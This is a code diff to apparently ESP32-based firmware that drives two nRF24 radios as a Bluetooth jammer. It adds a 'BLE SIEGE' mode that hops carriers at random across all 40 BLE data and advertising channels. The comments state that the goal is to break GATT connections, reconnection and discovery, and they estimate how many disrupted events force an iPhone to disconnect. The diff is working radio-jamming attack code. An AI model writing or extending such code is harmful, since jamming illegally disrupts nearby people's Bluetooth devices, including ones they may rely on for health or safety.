@@ -149,6 +149,7 @@ enum JammerMode {
     MODE_BT_CLASSIC,        // LED: blue breath     | sequential sweep ch 2-80
     MODE_BLE_ALL,           // LED: green breath    | all 40 BLE channels
     MODE_BLE_ADV,           // LED: yellow breath   | ch 2,26,80 rapid cycle
+    MODE_BLE_SIEGE,         // LED: orange breath   | random across all 40 BLE ch (data+adv)
     MODE_CONSTANT_CARRIER,  // LED: red breath      | CW on ch 45 (baseline test)
     MODE_COUNT
 };
@@ -185,6 +186,7 @@ static void jam_tracking(void);
 static void jam_bt_classic(void);
 static void jam_ble_all(void);
 static void jam_ble_adv(void);
+static void jam_ble_siege(void);
 static void jam_constant_carrier(void);
 static void print_mode(void);
 static void switch_mode(void);
@@ -342,6 +344,7 @@ static void get_mode_color(JammerMode mode, uint8_t *r, uint8_t *g, uint8_t *b)
         case MODE_BT_CLASSIC:       *r =   0; *g =   0; *b = 200; break; // blue
         case MODE_BLE_ALL:          *r =   0; *g = 200; *b =   0; break; // green
         case MODE_BLE_ADV:          *r = 200; *g = 200; *b =   0; break; // yellow
+        case MODE_BLE_SIEGE:        *r = 200; *g = 100; *b =   0; break; // orange
         case MODE_CONSTANT_CARRIER: *r = 200; *g =   0; *b =   0; break; // red
         default:                    *r = 200; *g = 200; *b = 200; break; // white fallback
     }
@@ -749,6 +752,7 @@ static void jam_task(void* arg)
             case MODE_BT_CLASSIC:       jam_bt_classic(); break;
             case MODE_BLE_ALL:          jam_ble_all(); break;
             case MODE_BLE_ADV:          jam_ble_adv(); break;
+            case MODE_BLE_SIEGE:        jam_ble_siege(); break;
             case MODE_CONSTANT_CARRIER: jam_constant_carrier(); break;
             default: break;
         }
@@ -860,7 +864,34 @@ static void jam_tracking(void)
     tracking_cycle++;
 }
 
-// MODE 6: CONSTANT CARRIER — CW on ch 45 (baseline / single-channel test)
+// ---------- MODE: BLE SIEGE — attack ALL 40 BLE channels (data + adv) ----------
+// After pairing, BLE connections use DATA channels 0-36 (not advertising).
+// Barrage wastes half its hops on non-BLE frequencies (odd nRF24 channels).
+// BLE SIEGE focuses BOTH radios exclusively on the 40 BLE-specific frequencies,
+// doubling interference density on BLE vs barrage (2/40 = 5% vs 2/80 = 2.5%).
+// Targets: GATT control connection (data ch), reconnection (adv ch), discovery.
+// iPhone supervision timeout ~720ms / ~30ms interval = 24 events to disconnect.
+// All 40 BLE channels mapped to nRF24 channel numbers:
+static const uint8_t ble_siege_channels[] = {
+     2,                          // BLE adv ch37 (2402 MHz)
+     4,  6,  8, 10, 12, 14, 16, // BLE data ch0-6
+    18, 20, 22, 24,             // BLE data ch7-10
+    26,                          // BLE adv ch38 (2426 MHz)
+    28, 30, 32, 34, 36, 38, 40, // BLE data ch11-17
+    42, 44, 46, 48, 50, 52, 54, // BLE data ch18-24
+    56, 58, 60, 62, 64, 66, 68, // BLE data ch25-31
+    70, 72, 74, 76, 78,         // BLE data ch32-36
+    80,                          // BLE adv ch39 (2480 MHz)
+};
+#define BLE_SIEGE_CH_COUNT (sizeof(ble_siege_channels) / sizeof(ble_siege_channels[0]))
+
+static void jam_ble_siege(void)
+{
+    hop_carrier(radio1, ble_siege_channels[xorshift32() % BLE_SIEGE_CH_COUNT]);
+    hop_carrier(radio2, ble_siege_channels[xorshift32() % BLE_SIEGE_CH_COUNT]);
+}
+
+// MODE 7: CONSTANT CARRIER — CW on ch 45 (baseline / single-channel test)
 static void jam_constant_carrier(void)
 {
     hop_carrier(radio1, 45);
@@ -877,6 +908,7 @@ static void print_mode(void)
         case MODE_BT_CLASSIC:       modeStr = "BT CLASSIC [blue] sweep ch 2-80"; break;
         case MODE_BLE_ALL:          modeStr = "BLE ALL [green] 40 BLE channels"; break;
         case MODE_BLE_ADV:          modeStr = "BLE ADV [yellow] ch 2,26,80 rapid"; break;
+        case MODE_BLE_SIEGE:        modeStr = "BLE SIEGE [orange] all 40 BLE ch random (data+adv)"; break;
         case MODE_CONSTANT_CARRIER: modeStr = "CONSTANT CARRIER [red] ch 45 test"; break;
         default: break;
     }
